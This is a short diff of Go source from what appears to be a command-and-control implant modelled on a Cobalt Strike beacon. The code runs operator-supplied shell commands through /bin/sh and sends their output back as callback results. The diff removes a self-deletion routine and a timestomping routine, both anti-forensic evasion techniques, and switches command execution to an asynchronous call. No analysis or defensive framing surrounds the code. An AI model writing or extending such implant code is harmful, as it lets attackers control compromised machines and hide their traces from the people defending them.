@@ -4,32 +4,10 @@ package command
 
 import (
 	"errors"
-	"main/config"
 	"main/packet"
-	"main/util"
-	"os"
 	"os/exec"
 	"strings"
 )
-
-// unchecked
-func DeleteSelf() {
-	if config.DeleteSelf {
-		selfName, err := os.Executable()
-		if err != nil {
-			return
-		}
-		_ = Exec([]byte(util.Sprintf("rm -f %s", selfName)))
-	}
-}
-
-func TimeStompInner(b []byte) error {
-	to, from, err := parseTimeStomp(b)
-	if err != nil {
-		return err
-	}
-	return Exec([]byte(util.Sprintf("touch -c -r %s %s", string(from), string(to))))
-}
 
 // no echo
 func Exec(b []byte) error {
@@ -53,12 +31,7 @@ func Run(b []byte) error {
 	if path == "%COMSPEC%" && strings.HasPrefix(args, "/C") {
 		args = args[3:]
 		cmd := exec.Command("/bin/sh", "-c", args)
-		result, err := cmd.CombinedOutput()
-		if err != nil {
-			return err
-		}
-		packet.PushResult(packet.CALLBACK_OUTPUT, []byte(result))
-		return nil
+		return RunAsync(cmd)
 	} else {
 		// there shouldn't be a path in run cmd
 		if len(path) != 0 {
@@ -71,11 +44,6 @@ func Run(b []byte) error {
 		} else {
 			cmd = exec.Command(parts[0])
 		}
-		result, err := cmd.CombinedOutput()
-		if err != nil {
-			return err
-		}
-		packet.PushResult(packet.CALLBACK_OUTPUT, []byte(result))
-		return nil
+		return RunAsync(cmd)
 	}
 }
